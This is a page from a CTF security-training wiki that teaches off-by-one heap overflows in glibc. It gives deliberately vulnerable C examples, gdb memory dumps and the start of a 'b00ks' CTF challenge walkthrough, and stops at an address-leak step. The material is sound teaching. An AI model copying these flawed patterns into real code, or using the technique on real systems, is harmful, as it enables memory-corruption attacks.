    <a href="../house_of_lore-zh/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_orange-zh/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_rabbit-zh/" title="House of Rabbit" class="md-nav__link">
      House of Rabbit
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../house_of_roman-zh/" title="House of Roman" class="md-nav__link">
      House of Roman
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
    
    <label class="md-nav__link" for="nav-8-2-5">
      IO_FILE Related
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-5">
        IO_FILE Related
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction-zh/" title="FILE Structure Description" class="md-nav__link">
      FILE Structure Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit-zh/" title="Forged Vtable to Hijack Control Flow" class="md-nav__link">
      Forged Vtable to Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop-zh/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24-zh.md" title="Use of IO_FILE Under Glibc 2.24" class="md-nav__link">
      Use of IO_FILE Under Glibc 2.24
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
    
    <label class="md-nav__link" for="nav-8-2-6">
      Race Condition
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-6">
        Race Condition
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction-zh/" title="Race Condition Introduction" class="md-nav__link">
      Race Condition Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem-zh/" title="Example" class="md-nav__link">
      Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
    
    <label class="md-nav__link" for="nav-8-2-7">
      Integer Overflow
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-7">
        Integer Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../integeroverflow/intof-zh/" title="Introduction to The Principle of Integer Overflow" class="md-nav__link">
      Introduction to The Principle of Integer Overflow
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
    
    <label class="md-nav__link" for="nav-8-2-8">
      Sandbox Escape
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-8">
        Sandbox Escape
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../sandbox/python-sandbox-escape-zh/" title="Python Sandbox Escape" class="md-nav__link">
      Python Sandbox Escape
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
    
    <label class="md-nav__link" for="nav-8-2-9">
      Linux Kernel
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-9">
        Linux Kernel
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/environment-zh/" title="Environment Setup" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/basic_knowledge-zh/" title="Basics" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_uaf-zh/" title="Kernel-UAF" class="md-nav__link">
      Kernel-UAF
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/kernel_rop-zh/" title="Kernel-ROP" class="md-nav__link">
      Kernel-ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/ret2usr-zh/" title="ret2usr" class="md-nav__link">
      ret2usr
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/bypass_smep-zh/" title="bypass-smep" class="md-nav__link">
      bypass-smep
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../kernel/double-fetch-zh/" title="Double Fetch" class="md-nav__link">
      Double Fetch
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
    
    <label class="md-nav__link" for="nav-8-2-10">
      arm-pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-10">
        arm-pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/environment-zh/" title="Environment Setup" class="md-nav__link">
      Environment Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../arm/arm_rop-zh/" title="arm-rop" class="md-nav__link">
      arm-rop
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-11" type="checkbox" id="nav-8-2-11">
    
    <label class="md-nav__link" for="nav-8-2-11">
      Summary
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-2-11">
        Summary
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-address-zh/" title="Address Leaking" class="md-nav__link">
      Address Leaking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/hijack-control-flow-zh/" title="Hijack Control Flow" class="md-nav__link">
      Hijack Control Flow
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../summary/get-shell-zh/" title="Get Shell" class="md-nav__link">
      Get Shell
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
    
    <label class="md-nav__link" for="nav-8-3">
      Windows Pwn
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-8-3">
        Windows Pwn
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/readme-zh/" title="Overview" class="md-nav__link">
      Overview
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3-2" type="checkbox" id="nav-8-3-2">
    
    <label class="md-nav__link" for="nav-8-3-2">
      Stack Overflow
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-8-3-2">
        Stack Overflow
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stack-introduce-zh/" title="Stack Introduction" class="md-nav__link">
      Stack Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/stackoverflow-basic-zh/" title="Stack Overflow Principle" class="md-nav__link">
      Stack Overflow Principle
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../windows/stackoverflow/shellcode-in-stack-zh/" title="shellcode-in-stack" class="md-nav__link">
      shellcode-in-stack
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
    
    <label class="md-nav__link" for="nav-9">
      Android
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-9">
        Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_develop/basic_develop-zh/" title="Android Development Basics" class="md-nav__link">
      Android Development Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
    
    <label class="md-nav__link" for="nav-9-2">
      Android Application Operating Mechanism Brief
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-9-2">
        Android Application Operating Mechanism Brief
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/readme-zh/" title="Basics" class="md-nav__link">
      Basics
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
    
    <label class="md-nav__link" for="nav-9-2-2">
      The Operating Mechanism of the Java Layer in Android
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-2">
        The Operating Mechanism of the Java Layer in Android
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/readme-zh/" title="Andriod Native" class="md-nav__link">
      Andriod Native
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali-zh/" title="Smali Introduction" class="md-nav__link">
      Smali Introduction
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
    
    <label class="md-nav__link" for="nav-9-2-2-3">
      Dex and ODEX
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-2-3">
        Dex and ODEX
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex-zh/" title="DEX" class="md-nav__link">
      DEX
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex-zh/" title="ODEX" class="md-nav__link">
      ODEX
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
    
    <label class="md-nav__link" for="nav-9-2-3">
      Android Native Layer Introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-3">
        Android Native Layer Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_operating_mechanism/native_layer/so-zh/" title="Android SO" class="md-nav__link">
      Android SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4" type="checkbox" id="nav-9-2-4">
    
    <label class="md-nav__link" for="nav-9-2-4">
      Android Reverse Basic Introduction
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-9-2-4">
        Android Reverse Basic Introduction
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/overview-zh/" title="Brief Description" class="md-nav__link">
      Brief Description
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/android_code_location-zh/" title="Android Key Part Location" class="md-nav__link">
      Android Key Part Location
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4-3" type="checkbox" id="nav-9-2-4-3">
    
    <label class="md-nav__link" for="nav-9-2-4-3">
      Android Simple Static Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-3">
        Android Simple Static Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/java-example-zh/" title="Android Java Layer Static Analysis" class="md-nav__link">
      Android Java Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/so-example-zh/" title="Android Native Layer Static Analysis" class="md-nav__link">
      Android Native Layer Static Analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/static/complex-example-zh/" title="Android Static Analysis Hybrid Example" class="md-nav__link">
      Android Static Analysis Hybrid Example
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-4-4" type="checkbox" id="nav-9-2-4-4">
    
    <label class="md-nav__link" for="nav-9-2-4-4">
      Android Simple Dynamic Analysis
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-9-2-4-4">
        Android Simple Dynamic Analysis
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug-zh/" title="Dynamic Debugging" class="md-nav__link">
      Dynamic Debugging
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug-zh/" title="Android Dynamic Debugging SO" class="md-nav__link">
      Android Dynamic Debugging SO
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-10" type="checkbox" id="nav-10">
    
    <label class="md-nav__link" for="nav-10">
      ICS
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-10">
        ICS
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/ctfs-zh/" title="ICS_CTF Contest" class="md-nav__link">
      ICS_CTF Contest
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/discover-zh/" title="ICS_CTF found" class="md-nav__link">
      ICS_CTF found
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/exploit-zh/" title="ICS_CTF uses" class="md-nav__link">
      ICS_CTF uses
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../../ics/learn-zh/" title="ICS_CTF Learning Resources" class="md-nav__link">
      ICS_CTF Learning Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    Introduction
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#off-by-one-vulnerability-principle" class="md-nav__link">
    off-by-one Vulnerability Principle
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#off-by-one-use-ideas" class="md-nav__link">
    off-by-one Use ideas
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#example-1" class="md-nav__link">
    Example 1
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#example-2" class="md-nav__link">
    Example 2
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#1-asis-ctf-2016-b00ks" class="md-nav__link">
    实例 1: Asis CTF 2016 b00ks
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#title-introduction" class="md-nav__link">
    Title introduction
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#create" class="md-nav__link">
    create
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#vulnerability" class="md-nav__link">
    Vulnerability
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#use" class="md-nav__link">
    Use
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leak" class="md-nav__link">
    Leak
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#off-by-one-override-pointer-low-byte" class="md-nav__link">
    off-by-one Override pointer low byte
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#using-the-stack-to-achieve-utilization" class="md-nav__link">
    Using the stack to achieve utilization
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit" class="md-nav__link">
    exploit
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#simple-plan" class="md-nav__link">
    Simple plan
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#instance-2-plaidctf-2015-plaiddb" class="md-nav__link">
    Instance 2 : plaidctf 2015 plaiddb
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#functional-analysis" class="md-nav__link">
    Functional Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit-analysis" class="md-nav__link">
    Exploit Analysis
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploit_1" class="md-nav__link">
    exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
      
      
      
      
        <li class="md-nav__item">
          <a href="#__comments" class="md-nav__link md-nav__link--active">
            评论
          </a>
        </li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/off_by_one.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
                
                
                <p><a href="./">EN</a> | <a href="../off_by_one-zh/">ZH</a></p>
<h1 id="off-by-one-in-the-heap">Off-By-One in the heap<a class="headerlink" href="#off-by-one-in-the-heap" title="Permanent link">&para;</a></h1>
<h2 id="introduction">Introduction<a class="headerlink" href="#introduction" title="Permanent link">&para;</a></h2>
<p>Strictly speaking, the off-by-one vulnerability is a special type of overflow vulnerability. Off-by-one means that when a program writes to a buffer, the number of bytes written exceeds the number of bytes requested by the buffer itself. And only one byte is crossed.</p>
<h2 id="off-by-one-vulnerability-principle">off-by-one Vulnerability Principle<a class="headerlink" href="#off-by-one-vulnerability-principle" title="Permanent link">&para;</a></h2>
<p>Off-by-one refers to a single-byte buffer overflow. This vulnerability is often related to the lack of strict boundary verification and string operations. Of course, it does not rule out that the size of the write is just one byte more. Where the boundary verification is not strict, usually includes</p>
<ul>
<li>When writing data to a heap block using a loop statement, the number of loops set incorrectly (which is common in C language beginners) results in more than one byte being written.</li>
<li>String operation is not appropriate</li>
</ul>
<p>In general, single-byte overflows are considered to be difficult to exploit, but because of the looseness of Linux&#39;s heap management mechanism ptmalloc validation, Linux-based off-by-one exploits are not complex and powerful.
In addition, the point to note is that off-by-one can be based on various buffers, such as stacks, bss segments, etc., but the heap-based off-by-one is more common in CTFs. We will only discuss the off-by-one situation on the heap here.</p>
<h2 id="off-by-one-use-ideas">off-by-one Use ideas<a class="headerlink" href="#off-by-one-use-ideas" title="Permanent link">&para;</a></h2>
<ol>
<li>The overflow byte is any byte that can be controlled: by modifying the size, there is overlap between the block structures, thereby leaking other block data or overwriting other block data. You can also use the NULL byte overflow method.</li>
<li>The overflow byte is NULL. When the size is 0x100, overflowing the NULL byte makes the <code>prev_in_use</code> bit clear, so the previous block is considered a free block. (1) At this point you can choose to use the unlink method (see the unlink section) for processing. (2) In addition, when the <code>prev_size</code> field is enabled, you can forge <code>prev_size</code>, causing overlap between blocks. The key to this method is that unlink does not check whether the last block of the block found by <code>prev_size</code> (theoretically the block currently unlinked) is equal to the block size currently being unlinked.</li>
</ol>
<p>In the latest version of the code, the check for the latter method in 2 has been added, but the check was not available before 2.28.</p>
<div class="codehilite"><pre><span></span>/* consolidate backward */

    if (!prev_inuse(p)) {

      prevsize = prev_size (p);

      size += prevsize;

      p = chunk_at_offset(p, -((long) prevsize));

/* The last two lines of code are added in the latest version, then the second method of 2 is not available, but there is no problem in 2.28 and before*/
      if (__glibc_unlikely (chunksize(p) != prevsize))

        malloc_printerr (&quot;corrupted size vs. prev_size while consolidating&quot;);

unlink_chunk (av, p);
    }
</pre></div>

<h3 id="example-1">Example 1<a class="headerlink" href="#example-1" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>int my_gets(char *ptr,int size)

{

    int i;

    for(i=0;i&lt;=size;i++)

    {

        ptr[i]=getchar();

    }

    return i;

}

int main()

{

    void *chunk1,*chunk2;

    chunk1=malloc(16);

    chunk2=malloc(16);

    puts(&quot;Get Input:&quot;);

    my_gets(chunk1,16);

    return 0;

}
</pre></div>

<p>Our own my_gets function caused an off-by-one vulnerability because the boundaries of the for loop were not controlled enough to cause writes to be executed once, which is also called a fence error.</p>
<blockquote>
<p>wikipedia:</p>
</blockquote>
<p>&gt; Fence errors (sometimes called pole errors or lamppost errors) are a type of error. Such as the following questions:</p>
<blockquote></blockquote>
<p>&gt; Build a straight fence (ie no circle), 30 meters long, 3 meters apart between each fence column, how many fence posts do you need?</p>
<blockquote></blockquote>
<p>&gt; The easiest answer 10 is wrong. This fence has 10 intervals and 11 fence posts.</p>
<p>We use gdb to debug the program. Before inputting, we can see that the two allocated user areas are 16-byte heap blocks.
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1

0x602010:   0x0000000000000000  0x0000000000000000

0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2

0x602030:   0x0000000000000000  0x0000000000000000
</pre></div></p>
<p>When we execute my_gets for input, we can see that the data has overflowed to cover the prev_size field of the next heap.
print 'A'*17</p>
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1

0x602010:   0x4141414141414141  0x4141414141414141

0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2

0x602030:   0x0000000000000000  0x0000000000000000
</pre></div>

<h3 id="example-2">Example 2<a class="headerlink" href="#example-2" title="Permanent link">&para;</a></h3>
<p>The second common scenario that causes off-by-one is string manipulation. The common reason is that the end of the string is incorrectly calculated.</p>
<div class="codehilite"><pre><span></span>int main(void)

{

    char buffer[40]=&quot;&quot;;

    void *chunk1;

    chunk1=malloc(24);

    puts(&quot;Get Input&quot;);

    gets(buffer);

    if(strlen(buffer)==24)

    {

        strcpy(chunk1,buffer);

    }

    return 0;



}
</pre></div>

<p>At first glance, the program doesn&#39;t seem to have any problems (regardless of stack overflow), and many people may write it in the actual code as well.
However, the behavior of strlen and strcpy is inconsistent, which leads to the occurrence of off-by-one.
Strlen is a function we are familiar with calculating the length of an ascii string. This function does not count the terminator <code>&amp;#39;\x00&amp;#39;</code> when calculating the length of a string, but strcpy copies the terminator when copying a string. &#39;\x00&#39;`. This caused us to write 25 bytes to chunk1, which we can see with gdb debugging.</p>
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1

0x602010:   0x0000000000000000  0x0000000000000000

0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk
</pre></div>

<p>Execute strcpy after we type &#39;A&#39;*24</p>
<div class="codehilite"><pre><span></span>0x602000:   0x0000000000000000  0x0000000000000021

0x602010:   0x4141414141414141  0x4141414141414141

0x602020:   0x4141414141414141  0x0000000000000400
</pre></div>

<p>You can see that the low byte of the size field of the next chunk is overwritten by the terminator <code>&amp;#39;\x00&amp;#39;</code>. This branch of the off-by-one is called NULL byte off-by-one, which we will see later. The difference between off-by-one and NULL byte off-by-one.
There is still one thing why the low byte is overwritten, because the byte order of the CPU we usually use is small endian, such as a DWORD value stored in the memory using the little endian method.</p>
<div class="codehilite"><pre><span></span>DWORD 0x41424344

Memory 0x44, 0x43, 0x42, 0x41
</pre></div>

<h2 id="1-asis-ctf-2016-b00ks">实例 1: Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a><a class="headerlink" href="#1-asis-ctf-2016-b00ks" title="Permanent link">&para;</a></h2>
<h3 id="title-introduction">Title introduction<a class="headerlink" href="#title-introduction" title="Permanent link">&para;</a></h3>
<p>The topic is a common menu-style program that features a library management system.</p>
<div class="codehilite"><pre><span></span>1. Create a book

2. Delete a book

3. Edit a book

4. Print book detail

5. Change current author name

6. Exit
</pre></div>

<p>The program provides the ability to create, delete, edit, and print books. The title is a 64-bit program and the protection is as follows.</p>
<div class="codehilite"><pre><span></span>Canary                        : No

NX                            : Yes

PIE                           : Yes

Fortify                       : No

RelRO                         : Full
</pre></div>

<p>Each time a program creates a program, it allocates a 0x20 byte structure to maintain its information.</p>
<div class="codehilite"><pre><span></span>struct book

{

    int id;

    char *name;

    char *description;

    int size;

}
</pre></div>

<h3 id="create">create<a class="headerlink" href="#create" title="Permanent link">&para;</a></h3>
<p>Name and description exist in the book structure, and name and description are allocated on the heap. First allocate the name buffer, use malloc, the size is custom but less than 32.</p>
<div class="codehilite"><pre><span></span>printf(&quot;\nEnter book name size: &quot;, *(_QWORD *)&amp;size);

__isoc99_scanf(&quot;%d&quot;, &amp;size);

printf(&quot;Enter book name (Max 32 chars): &quot;, &amp;size);

ptr = malloc(size);
</pre></div>

<p>The description is then assigned, the same size is customizable but unlimited.</p>
<div class="codehilite"><pre><span></span>printf(&quot;\nEnter book description size: &quot;, *(_QWORD *)&amp;size);

        __isoc99_scanf(&quot;%d&quot;, &amp;size);



v5 = malloc(size);
</pre></div>

<p>After allocating the memory of the book structure</p>
<div class="codehilite"><pre><span></span>book = malloc(0x20uLL);

if ( book )

{

    *((_DWORD *)book + 6) = size;

    *((_QWORD *)off_202010 + v2) = book;

    *((_QWORD *)book + 2) = description;

    *((_QWORD *)book + 1) = name;

    *(_DWORD *)book = ++unk_202024;

    return 0LL;

}
</pre></div>

<h3 id="vulnerability">Vulnerability<a class="headerlink" href="#vulnerability" title="Permanent link">&para;</a></h3>
<p>There is a null byte off-by-one vulnerability in the read function of the program. If you look closely at the read function, you can find that the consideration of the boundary is not appropriate.</p>
<div class="codehilite"><pre><span></span>signed __int64 __fastcall my_read(_BYTE *ptr, int number)

{

  int i; // [rsp+14h] [rbp-Ch]

  _BYTE *buf; // [rsp+18h] [rbp-8h]



  if ( number &lt;= 0 )

    return 0LL;

buf = ptr;
  for ( i = 0; ; ++i )

  {

    if ( (unsigned int)read(0, buf, 1uLL) != 1 )

      return 1LL;

    if ( *buf == &#39;\n&#39; )

      break;

++ buf;
    if ( i == number )

      break;

  }

* buf = 0;
  return 0LL;

}
</pre></div>

<h3 id="use">Use<a class="headerlink" href="#use" title="Permanent link">&para;</a></h3>
<h4 id="leak">Leak<a class="headerlink" href="#leak" title="Permanent link">&para;</a></h4>
<p>Because the my_read function in the program has a null byte off-by-one , in fact the terminator &#39;\x00&#39; read by my_read is written to 0x555555756060. This will overwrite the terminator &#39;\x00&#39; when 0x555555756060~0x555555756068 is written to the book pointer, so there is a vulnerability in the address leak. The value of the first item in the pointer array can be obtained by printing the author name.</p>
<div class="codehilite"><pre><span></span>0x555555756040: 0x6161616161616161  0x6161616161616161

0x555555756050: 0x6161616161616161  0x6161616161616161   &lt;== author name

0x555555756060: 0x0000555555757480 &lt;== pointer array    0x0000000000000000

0x555555756070: 0x0000000000000000  0x0000000000000000

